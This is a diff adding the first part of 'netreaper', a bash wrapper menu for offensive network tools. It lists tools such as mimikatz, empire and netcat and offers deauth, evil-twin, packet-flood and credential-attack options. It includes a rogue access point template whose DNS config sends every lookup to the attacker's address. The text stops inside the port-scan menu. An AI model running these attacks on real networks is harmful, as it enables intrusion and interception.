@@ -1,0 +1,2736 @@
+#!/usr/bin/env bash
+#═══════════════════════════════════════════════════════════════════════════════
+#
+#    ███╗   ██╗███████╗████████╗██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
+#    ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
+#    ██╔██╗ ██║█████╗     ██║   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
+#    ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
+#    ██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
+#    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
+#
+#    "Some tools scan. Some tools attack. I do both."
+#
+#    Author:  Network & Firewall Technicians (NFT)
+#    Version: 3.1.0 (Retribution)
+#    License: MIT
+#    
+#    What happens when aircrack-ng and wifite have a baby,
+#    disown it, and it comes back with a vengeance.
+#
+#═══════════════════════════════════════════════════════════════════════════════
+
+set -uo pipefail
+
+QUIET=0
+JSON_OUTPUT=0
+
+readonly VERSION="3.3.4"
+readonly CODENAME="Retribution"
+readonly SCRIPT_NAME="netreaper"
+# shellcheck disable=SC2034
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+# shellcheck disable=SC2034
+readonly SCRIPT_DIR
+readonly CONFIG_DIR="${HOME}/.netreaper"
+readonly BASE_LOG_DIR="${CONFIG_DIR}/logs"
+LOG_DIR="$BASE_LOG_DIR"
+readonly BASE_OUTPUT_DIR="${CONFIG_DIR}/output"
+readonly BASE_LOOT_DIR="${CONFIG_DIR}/loot"
+OUTPUT_DIR="$BASE_OUTPUT_DIR"
+LOOT_DIR="$BASE_LOOT_DIR"
+readonly LEGAL_FILE="${CONFIG_DIR}/.legal_accepted"
+readonly SESSION_FILE="${CONFIG_DIR}/.current_session"
+readonly SESSIONS_DIR="${CONFIG_DIR}/sessions"
+CURRENT_SESSION=""
+SESSION_NAME=""
+readonly TMP_DIR="/tmp/netreaper"
+
+# shellcheck disable=SC2016
+HOSTAPD_TEMPLATE='interface=${IFACE}
+driver=nl80211
+ssid=${TARGET_SSID}
+hw_mode=g
+channel=${CHANNEL}
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0'
+
+# shellcheck disable=SC2016
+DNSMASQ_TEMPLATE='interface=${IFACE}
+dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+log-queries
+log-dhcp
+address=/#/192.168.1.1'
+
+#═══════════════════════════════════════════════════════════════════════════════
+# COLOR PALETTE - Blood, Venom, and Ghost
+#═══════════════════════════════════════════════════════════════════════════════
+
+if [[ -t 1 ]] && [[ "${NO_COLOR:-}" != "1" ]]; then
+    readonly C_BLOOD=$'\033[38;5;196m'
+    readonly C_VENOM=$'\033[38;5;46m'
+    readonly C_GHOST=$'\033[38;5;51m'
+    readonly C_SKULL=$'\033[38;5;231m'
+    readonly C_SHADOW=$'\033[38;5;240m'
+    readonly C_FIRE=$'\033[38;5;208m'
+    readonly C_PURPLE=$'\033[38;5;129m'
+    readonly C_GOLD=$'\033[38;5;220m'
+    readonly C_RESET=$'\033[0m'
+    readonly C_BOLD=$'\033[1m'
+    readonly C_DIM=$'\033[2m'
+else
+    readonly C_BLOOD="" C_VENOM="" C_GHOST="" C_SKULL="" C_SHADOW=""
+    readonly C_FIRE="" C_PURPLE="" C_GOLD="" C_RESET="" C_BOLD="" C_DIM=""
+fi
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL ARSENAL - 60+ Capabilities
+#═══════════════════════════════════════════════════════════════════════════════
+
+# shellcheck disable=SC2034
+declare -a TOOLS_SCANNING=(nmap masscan unicornscan rustscan zmap netdiscover arp-scan fping hping3 p0f arping nbtscan amap)
+# shellcheck disable=SC2034
+declare -a TOOLS_DNS=(dnsenum dnsmap dnsrecon fierce)
+# shellcheck disable=SC2034
+declare -a TOOLS_SNMP=(onesixtyone snmpwalk snmpcheck)
+# shellcheck disable=SC2034
+declare -a TOOLS_SMB=(smbmap smbclient enum4linux)
+declare -a TOOLS_SSL=(sslscan sslyze testssl.sh)
+declare -a TOOLS_TRAFFIC=(tcpdump wireshark tshark ettercap bettercap)
+declare -a TOOLS_WEB=(nikto wpscan sqlmap dirb gobuster ffuf burpsuite nuclei httpx subfinder amass)
+declare -a TOOLS_WIFI=(aircrack-ng airmon-ng airodump-ng aireplay-ng wifite reaver bully pixiewps bettercap fluxion wifiphisher mdk3 mdk4 cowpatty)
+declare -a TOOLS_EXPLOIT=(metasploit-framework searchsploit empire covenant crackmapexec)
+declare -a TOOLS_CREDS=(hashcat john hydra medusa crackmapexec cowpatty)
+declare -a TOOLS_POST=(impacket-secretsdump impacket-smbclient impacket-psexec impacket-wmiexec mimikatz)
+declare -a TOOLS_OSINT=(theharvester recon-ng maltego shodan)
+# shellcheck disable=SC2034
+declare -a TOOLS_UTIL=(netcat ncat socat proxychains)
+
+#═══════════════════════════════════════════════════════════════════════════════
+# LOGGING
+#═══════════════════════════════════════════════════════════════════════════════
+
+_log() {
+    local level="$1" color="$2" symbol="$3"
+    shift 3
+    local timestamp
+    timestamp=$(date '+%H:%M:%S')
+    local message="$*"
+    if [[ "$JSON_OUTPUT" == "1" ]]; then
+        local safe
+        safe=${message//"/\\"}
+        printf '{"level":"%s","time":"%s","message":"%s"}\n' "$level" "$timestamp" "$safe"
+    elif [[ "$QUIET" -ne 1 ]]; then
+        echo -e "${C_SHADOW}[${timestamp}]${C_RESET} ${color}${symbol}${C_RESET} $message"
+    fi
+    echo "[$(date -Iseconds)] [$level] $*" >> "${LOG_DIR}/netreaper.log" 2>/dev/null || true
+}
+
+log_info()    { _log "INFO"    "$C_GHOST"  "[*]" "$@"; }
+log_success() { _log "SUCCESS" "$C_VENOM"  "[✓]" "$@"; }
+log_warning() { _log "WARN"    "$C_FIRE"   "[!]" "$@"; }
+log_error()   { _log "ERROR"   "$C_BLOOD"  "[✗]" "$@"; }
+log_attack()  { _log "ATTACK"  "$C_BLOOD"  "[⚔]" "$@"; }
+log_target()  { _log "TARGET"  "$C_FIRE"   "[◎]" "$@"; }
+log_loot()    { _log "LOOT"    "$C_GOLD"   "[★]" "$@"; }
+
+#═══════════════════════════════════════════════════════════════════════════════
+# VISUAL EFFECTS
+#═══════════════════════════════════════════════════════════════════════════════
+
+typewriter() {
+    local text="$1" delay="${2:-0.015}"
+    [[ "$QUIET" -eq 1 ]] && { echo "$text"; return; }
+    for ((i=0; i<${#text}; i++)); do
+        printf '%s' "${text:$i:1}"
+        sleep "$delay"
+    done
+    echo
+}
+
+spinner() {
+    local pid=$1 msg="${2:-Processing}"
+    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
+    local i=0
+    tput civis 2>/dev/null || true
+    while kill -0 "$pid" 2>/dev/null; do
+        printf "\r    ${C_GHOST}%s${C_RESET} %s..." "${frames[$i]}" "$msg"
+        i=$(( (i+1) % ${#frames[@]} ))
+        sleep 0.08
+    done
+    printf "\r    ${C_VENOM}✓${C_RESET} %s      \n" "$msg"
+    tput cnorm 2>/dev/null || true
+}
+
+progress_bar() {
+    local current=$1 total=$2 width=40 label="${3:-}"
+    local pct=$((current * 100 / total))
+    local filled=$((current * width / total))
+    local empty=$((width - filled))
+    printf '\r    %s[%s' "$C_SHADOW" "$C_RESET"
+    printf '%s%*s%s' "$C_VENOM" "$filled" "" "$C_RESET" | tr ' ' '█'
+    printf '%s%*s%s' "$C_SHADOW" "$empty" "" "$C_RESET" | tr ' ' '░'
+    printf '%s]%s %s%3d%%%s' "$C_SHADOW" "$C_RESET" "$C_SKULL" "$pct" "$C_RESET"
+    [[ -n "$label" ]] && printf ' %s%s%s' "$C_DIM" "$label" "$C_RESET"
+}
+
+draw_line() {
+    local char="${1:-─}" width="${2:-70}"
+    printf '%*s\n' "$width" '' | tr ' ' "$char"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# BANNER
+#═══════════════════════════════════════════════════════════════════════════════
+
+show_banner() {
+    clear
+    echo
+    echo -e "${C_BLOOD}"
+    cat << 'BANNER'
+    ███╗   ██╗███████╗████████╗██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
+    ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
+    ██╔██╗ ██║█████╗     ██║   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
+    ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
+    ██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
+    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
+BANNER
+    echo -e "${C_RESET}"
+    echo -e "    ${C_SHADOW}═══════════════════════════════════════════════════════════════════════${C_RESET}"
+    echo -e "    ${C_SHADOW}║${C_RESET} ${C_GHOST}\"Some tools scan. Some tools attack.${C_FIRE} I do both.${C_GHOST}\"${C_RESET}                  ${C_SHADOW}║${C_RESET}"
+    echo -e "    ${C_SHADOW}═══════════════════════════════════════════════════════════════════════${C_RESET}"
+    echo -e "                        ${C_VENOM}[ v${VERSION} ${C_SHADOW}//${C_VENOM} ${CODENAME} ${C_SHADOW}//${C_VENOM} 60+ Tools ]${C_RESET}"
+    echo
+}
+
+show_mini_banner() {
+    echo -e "${C_BLOOD}    ╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "${C_BLOOD}    ║${C_RESET}  ${C_SKULL}NETREAPER${C_RESET} ${C_SHADOW}v${VERSION}${C_RESET}                                              ${C_BLOOD}║${C_RESET}"
+    echo -e "${C_BLOOD}    ╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# LEGAL DISCLAIMER
+#═══════════════════════════════════════════════════════════════════════════════
+
+show_skull() {
+    echo -e "${C_BLOOD}"
+    cat << 'SKULL'
+                              ______
+                           .-"      "-.
+                          /            \
+                         |              |
+                         |,  .-.  .-.  ,|
+                         | )(_o/  \o_)( |
+                         |/     /\     \|
+                         (_     ^^     _)
+                          \__|IIIIII|__/
+                           | \IIIIII/ |
+                           \          /
+                            `--------`
+SKULL
+    echo -e "${C_RESET}"
+}
+
+show_legal() {
+    show_skull
+    echo -e "${C_BLOOD}${C_BOLD}"
+    echo "    ╔═══════════════════════════════════════════════════════════════════╗"
+    echo "    ║                     ⚠  LEGAL DISCLAIMER  ⚠                        ║"
+    echo "    ╠═══════════════════════════════════════════════════════════════════╣"
+    echo "    ║                                                                   ║"
+    echo "    ║  This tool is for AUTHORIZED PENETRATION TESTING ONLY.            ║"
+    echo "    ║                                                                   ║"
+    echo "    ║  By proceeding, you confirm:                                      ║"
+    echo "    ║  • You have WRITTEN authorization to test target systems          ║"
+    echo "    ║  • You accept FULL legal responsibility for your actions          ║"
+    echo "    ║  • You understand unauthorized access is a FEDERAL CRIME          ║"
+    echo "    ║  • The authors accept NO LIABILITY for misuse                     ║"
+    echo "    ║                                                                   ║"
+    echo "    ║  CFAA violations: Up to 20 years imprisonment                     ║"
+    echo "    ║                                                                   ║"
+    echo "    ╚═══════════════════════════════════════════════════════════════════╝"
+    echo -e "${C_RESET}"
+    echo
+    echo -ne "    ${C_FIRE}Type '${C_VENOM}I ACCEPT${C_FIRE}' to proceed (case sensitive): ${C_RESET}"
+}
+
+check_legal() {
+    [[ -f "$LEGAL_FILE" ]] && return 0
+    
+    clear
+    show_legal
+    read -r response
+    
+    if [[ "$response" == "I ACCEPT" ]]; then
+        mkdir -p "$(dirname "$LEGAL_FILE")"
+        echo "$(date -Iseconds) | $(whoami)@$(hostname) | Accepted" > "$LEGAL_FILE"
+        echo
+        typewriter "    Access granted. The reaper awakens." 0.02
+        sleep 1
+        return 0
+    else
+        echo -e "\n    ${C_BLOOD}Access denied. Come back when you're ready.${C_RESET}\n"
+        exit 1
+    fi
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# UTILITIES
+#═══════════════════════════════════════════════════════════════════════════════
+
+require_root() {
+    if [[ $EUID -ne 0 ]]; then
+        log_error "This operation requires root privileges"
+        echo -e "    ${C_SHADOW}Run: sudo $SCRIPT_NAME ...${C_RESET}"
+        return 1
+    fi
+}
+
+check_tool() {
+    local tool="$1"
+    if command -v "$tool" &>/dev/null; then
+        return 0
+    else
+        log_warning "Tool not found: $tool"
+        echo -e "    ${C_SHADOW}Install: sudo apt install $tool${C_RESET}"
+        return 1
+    fi
+}
+
+is_private_ip() {
+    local ip="$1"
+    [[ "$ip" =~ ^10\. ]] && return 0
+    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[01])\. ]] && return 0
+    [[ "$ip" =~ ^192\.168\. ]] && return 0
+    [[ "$ip" =~ ^127\. ]] && return 0
+    return 1
+}
+
+validate_target() {
+    local target="$1"
+    
+    # Block .gov and .mil
+    if [[ "$target" =~ \.(gov|mil)$ ]] || [[ "$target" =~ \.(gov|mil)/ ]]; then
+        log_error "Targeting government/military domains is prohibited"
+        return 1
+    fi
+    
+    # Warn on external targets
+    if ! is_private_ip "$target" && [[ ! "$target" =~ ^(localhost|127\.) ]]; then
+        echo
+        echo -e "    ${C_FIRE}⚠  EXTERNAL TARGET DETECTED${C_RESET}"
+        log_target "$target"
+        echo -ne "    ${C_GHOST}Do you have written authorization? [yes/no]: ${C_RESET}"
+        read -r confirm
+        [[ "${confirm,,}" == "yes" ]] || return 1
+    fi
+    
+    return 0
+}
+
+get_target() {
+    echo
+    echo -ne "    ${C_FIRE}◎ TARGET: ${C_RESET}"
+    read -r TARGET
+    
+    [[ -z "$TARGET" ]] && { log_error "No target specified"; return 1; }
+    validate_target "$TARGET" || return 1
+    
+    # Create output file path
+    local safe_target="${TARGET//[^a-zA-Z0-9._-]/_}"
+    OUTPUT_FILE="${OUTPUT_DIR}/${safe_target}_$(date +%Y%m%d_%H%M%S)"
+    
+    return 0
+}
+
+get_interface() {
+    echo
+    echo -e "    ${C_GHOST}Available interfaces:${C_RESET}"
+    ip -o link show | awk -F': ' '{print "      " $2}' | grep -v "^lo$"
+    echo
+    echo -ne "    ${C_FIRE}◎ INTERFACE: ${C_RESET}"
+    read -r IFACE
+    
+    [[ -z "$IFACE" ]] && { log_error "No interface specified"; return 1; }
+    ip link show "$IFACE" &>/dev/null || { log_error "Interface not found: $IFACE"; return 1; }
+    
+    return 0
+}
+
+pause() {
+    echo
+    echo -ne "    ${C_SHADOW}Press Enter to continue...${C_RESET}"
+    read -r
+}
+
+#══════════════════════════════════════════════════════════════════════════════
+# SESSION MANAGEMENT
+#══════════════════════════════════════════════════════════════════════════════
+
+set_session_paths() {
+    local session_path="$1"
+    mkdir -p "$session_path" "$session_path/scans" "$session_path/loot" "$session_path/logs" "$session_path/notes"
+    OUTPUT_DIR="${session_path}/scans"
+    LOOT_DIR="${session_path}/loot"
+    LOG_DIR="${session_path}/logs"
+    CURRENT_SESSION="$session_path"
+    SESSION_NAME="$(basename "$session_path")"
+}
+
+# shellcheck disable=SC2120
+session_start() {
+    local provided_name="${1:-}" provided_scope="${2:-}"
+    if [[ -z "$provided_name" ]]; then
+        echo -ne "    ${C_GHOST}Session name [engagement_$(date +%Y%m%d_%H%M)]: ${C_RESET}"
+        read -r provided_name
+    fi
+    local name="${provided_name:-engagement_$(date +%Y%m%d_%H%M)}"
+    local session_path="${SESSIONS_DIR}/${name}"
+    if [[ -d "$session_path" ]]; then
+        log_warning "Session already exists: $name"
+    fi
+    mkdir -p "$SESSIONS_DIR"
+    set_session_paths "$session_path"
+    local scope="$provided_scope"
+    if [[ -z "$scope" ]]; then
+        echo -ne "    ${C_GHOST}Target scope/notes: ${C_RESET}"
+        read -r scope
+    fi
+    local meta_file="${session_path}/session.meta"
+    {
+        echo "name=$name"
+        echo "created=$(date -Iseconds)"
+        echo "scope=$scope"
+        echo "operator=$(whoami)@$(hostname)"
+    } > "$meta_file"
+    echo "$name" > "$SESSION_FILE"
+    log_success "Session started: $name"
+    log_info "Output: $OUTPUT_DIR | Loot: $LOOT_DIR"
+}
+
+# shellcheck disable=SC2120
+session_resume() {
+    if [[ ! -d "$SESSIONS_DIR" ]] || [[ -z "$(ls -A "$SESSIONS_DIR" 2>/dev/null)" ]]; then
+        log_warning "No sessions to resume"
+        return 1
+    fi
+
+    local selection name_input="${1:-}"
+    if [[ -n "$name_input" ]] && [[ -d "${SESSIONS_DIR}/${name_input}" ]]; then
+        selection=manual
+    else
+        echo -e "    ${C_GHOST}Available sessions:${C_RESET}"
+        local idx=1
+        local sessions=()
+        while IFS= read -r session_dir; do
+            sessions+=("$session_dir")
+            printf "    ${C_GHOST}[%d]${C_RESET} %s\n" "$idx" "$(basename "$session_dir")"
+            idx=$((idx + 1))
+        done < <(find "$SESSIONS_DIR" -maxdepth 1 -mindepth 1 -type d | sort)
+
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r selection
+
+        if [[ -z "$selection" ]] || ! [[ "$selection" =~ ^[0-9]+$ ]]; then
+            log_error "Invalid selection"
+            return 1
+        fi
+
+        local index=$((selection - 1))
+        if (( index < 0 || index >= ${#sessions[@]} )); then
+            log_error "Selection out of range"
+            return 1
+        fi
+
+        local chosen="${sessions[$index]}"
+        set_session_paths "$chosen"
+        echo "$SESSION_NAME" > "$SESSION_FILE"
+        log_success "Resumed session: $SESSION_NAME"
+        return 0
+    fi
+
+    if [[ "$selection" == "manual" ]]; then
+        set_session_paths "${SESSIONS_DIR}/${name_input}"
+        echo "$SESSION_NAME" > "$SESSION_FILE"
+        log_success "Resumed session: $SESSION_NAME"
+    fi
+}
+
+session_status() {
+    if [[ -z "$CURRENT_SESSION" ]]; then
+        log_info "No active session"
+        return
+    fi
+
+    local meta_file="${CURRENT_SESSION}/session.meta"
+    local created scope
+    if [[ -f "$meta_file" ]]; then
+        # shellcheck disable=SC1090
+        source "$meta_file"
+        created="${created:-$(date -Iseconds)}"
+        scope="${scope:-}"
+    else
+        created="$(date -Iseconds)"
+        scope=""
+    fi
+
+    local elapsed created_epoch
+    created_epoch=$(date -d "$created" +%s 2>/dev/null || date +%s)
+    elapsed=$(( ( $(date +%s) - created_epoch ) / 60 ))
+    echo
+    echo -e "    ${C_SKULL}╔═══════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "    ${C_SKULL}║${C_RESET}                   ${C_FIRE}SESSION STATUS${C_RESET}                        ${C_SKULL}║${C_RESET}"
+    echo -e "    ${C_SKULL}╚═══════════════════════════════════════════════════════════╝${C_RESET}"
+    echo
+    echo -e "    ${C_GHOST}Name:${C_RESET} ${SESSION_NAME}"
+    echo -e "    ${C_GHOST}Started:${C_RESET} ${created}"
+    [[ -n "$scope" ]] && echo -e "    ${C_GHOST}Scope:${C_RESET} ${scope}"
+    echo -e "    ${C_GHOST}Elapsed:${C_RESET} ${elapsed} minutes"
+    echo -e "    ${C_GHOST}Scans:${C_RESET} $(find "$CURRENT_SESSION/scans" -type f 2>/dev/null | wc -l)"
+    echo -e "    ${C_GHOST}Loot:${C_RESET} $(find "$CURRENT_SESSION/loot" -type f 2>/dev/null | wc -l)"
+    echo -e "    ${C_GHOST}Logs:${C_RESET} $(find "$CURRENT_SESSION/logs" -type f 2>/dev/null | wc -l)"
+    echo -e "    ${C_GHOST}Notes:${C_RESET} $(find "$CURRENT_SESSION/notes" -type f 2>/dev/null | wc -l)"
+}
+
+session_export() {
+    if [[ -z "$CURRENT_SESSION" ]]; then
+        log_error "No active session to export"
+        return 1
+    fi
+    local meta_file="${CURRENT_SESSION}/session.meta"
+    local scope=""
+    if [[ -f "$meta_file" ]]; then
+        # shellcheck disable=SC1090
+        source "$meta_file"
+        scope="${scope:-}"
+    fi
+    local dest_default="${HOME}/Desktop/${SESSION_NAME}_session.zip"
+    echo -ne "    ${C_GHOST}Export zip path [${dest_default}]: ${C_RESET}"
+    read -r dest
+    dest="${dest:-$dest_default}"
+
+    if ! command -v zip &>/dev/null; then
+        log_error "zip not installed"
+        return 1
+    fi
+
+    local summary="${CURRENT_SESSION}/session_summary.txt"
+    {
+        echo "Session: ${SESSION_NAME}"
+        echo "Exported: $(date -Iseconds)"
+        echo "Scope: ${scope:-}" 
+        echo "Files:"
+        find "$CURRENT_SESSION" -maxdepth 2 -type f -printf '%P\n' 2>/dev/null
+    } > "$summary"
+
+    (cd "$CURRENT_SESSION/.." && zip -r "$dest" "$SESSION_NAME" >/dev/null)
+    log_loot "Session exported to $dest"
+}
+
+session_notes() {
+    if [[ -z "$CURRENT_SESSION" ]]; then
+        log_error "Start or resume a session first"
+        return 1
+    fi
+    local notes_file="${CURRENT_SESSION}/notes/notes.md"
+    mkdir -p "${CURRENT_SESSION}/notes"
+    local editor="${EDITOR:-nano}"
+    "$editor" "$notes_file"
+}
+
+session_list() {
+    if [[ ! -d "$SESSIONS_DIR" ]] || [[ -z "$(ls -A "$SESSIONS_DIR" 2>/dev/null)" ]]; then
+        log_warning "No sessions found"
+        return
+    fi
+    echo
+    echo -e "    ${C_GHOST}All sessions:${C_RESET}"
+    find "$SESSIONS_DIR" -maxdepth 1 -mindepth 1 -type d -printf '    %f\n' | sort
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# MAIN MENU
+#═══════════════════════════════════════════════════════════════════════════════
+
+main_menu() {
+    while true; do
+        show_banner
+        
+        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                         ${C_FIRE}◤ ARSENAL ◢${C_RESET}                              ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_BLOOD}⚔ RECON${C_RESET}                          ${C_VENOM}🛡 WIRELESS${C_RESET}                      ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_SHADOW}─────────────────────${C_RESET}           ${C_SHADOW}─────────────────────${C_RESET}           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Port Scanning              ${C_GHOST}[7]${C_RESET}  WiFi Recon                   ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Network Discovery          ${C_GHOST}[8]${C_RESET}  Deauth Attack                ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} DNS Enumeration            ${C_GHOST}[9]${C_RESET}  WPS Attack                   ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} SSL/TLS Analysis           ${C_GHOST}[10]${C_RESET} Handshake Capture            ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} SNMP Sweep                 ${C_GHOST}[11]${C_RESET} Crack Handshake              ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} SMB Enumeration            ${C_GHOST}[12]${C_RESET} Evil Twin Attack             ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                               ${C_GHOST}[13]${C_RESET} Monitor Mode                 ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                               ${C_GHOST}[14]${C_RESET} Channel Hopper               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_BLOOD}💀 EXPLOIT${C_RESET}                       ${C_FIRE}🔥 STRESS${C_RESET}                        ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_SHADOW}─────────────────────${C_RESET}           ${C_SHADOW}─────────────────────${C_RESET}           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[15]${C_RESET} Web Attacks               ${C_GHOST}[19]${C_RESET} Bandwidth Test (iperf)       ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[16]${C_RESET} SQL Injection             ${C_GHOST}[20]${C_RESET} Packet Flood (hping3)        ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[17]${C_RESET} Metasploit Console        ${C_GHOST}[21]${C_RESET} HTTP Load Test               ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[18]${C_RESET} Exploit Search            ${C_GHOST}[22]${C_RESET} Network Impairment           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_PURPLE}🔧 TOOLS${C_RESET}                         ${C_GHOST}📊 INTEL${C_RESET}                        ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_SHADOW}─────────────────────${C_RESET}           ${C_SHADOW}─────────────────────${C_RESET}           ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[23]${C_RESET} Install Arsenal           ${C_GHOST}[26]${C_RESET} OSINT Recon                  ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[24]${C_RESET} Tool Status               ${C_GHOST}[27]${C_RESET} Generate Report              ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[25]${C_RESET} View Logs                 ${C_GHOST}[28]${C_RESET} Traffic Capture              ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[29]${C_RESET} Credential Attacks                                         ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[30]${C_RESET} Post-Exploitation                                        ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[S]${C_RESET} Session Management                                             ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}              ${C_BLOOD}[Q]${C_RESET} Quit    ${C_GHOST}[H]${C_RESET} Help    ${C_VENOM}[R]${C_RESET} Run Direct              ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
+        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
+        echo
+        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+        read -r choice
+        
+        case "$choice" in
+            1)  menu_port_scan ;;
+            2)  menu_discovery ;;
+            3)  menu_dns ;;
+            4)  menu_ssl ;;
+            5)  cmd_snmp_sweep ;;
+            6)  cmd_smb_enum ;;
+            7)  menu_wifi_recon ;;
+            8)  cmd_deauth ;;
+            9)  cmd_wps_attack ;;
+            10) cmd_handshake_capture ;;
+            11) menu_wifi_crack ;;
+            12) menu_evil_twin ;;
+            13) cmd_monitor_mode ;;
+            14) cmd_channel_hop ;;
+            15) menu_web ;;
+            16) cmd_sqlmap ;;
+            17) cmd_metasploit ;;
+            18) cmd_searchsploit ;;
+            19) cmd_iperf3 ;;
+            20) cmd_hping3 ;;
+            21) cmd_http_load ;;
+            22) cmd_netem ;;
+            23) cmd_install_arsenal ;;
+            24) cmd_tool_status ;;
+            25) cmd_view_logs ;;
+            26) menu_osint ;;
+            27) cmd_generate_report ;;
+            28) cmd_traffic_capture ;;
+            29) menu_creds ;;
+            30) menu_post_exploit ;;
+            q|Q) 
+                echo
+                typewriter "    The reaper sleeps... for now." 0.02
+                echo
+                exit 0 
+                ;;
+            h|H) show_help ;;
+            s|S) menu_session ;;
+            r|R) cmd_run_direct ;;
+            "") ;;
+            *)  log_error "Invalid selection: $choice" ;;
+        esac
+    done
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# SUBMENUS
+#═══════════════════════════════════════════════════════════════════════════════
+
+menu_port_scan() {
+    while true; do
+        clear
+        show_mini_banner
+        echo
+        echo -e "    ${C_BLOOD}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
+        echo -e "    ${C_BLOOD}║${C_RESET}                    ${C_SKULL}⚔ PORT SCANNING${C_RESET}                          ${C_BLOOD}║${C_RESET}"
+        echo -e "    ${C_BLOOD}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
+        echo
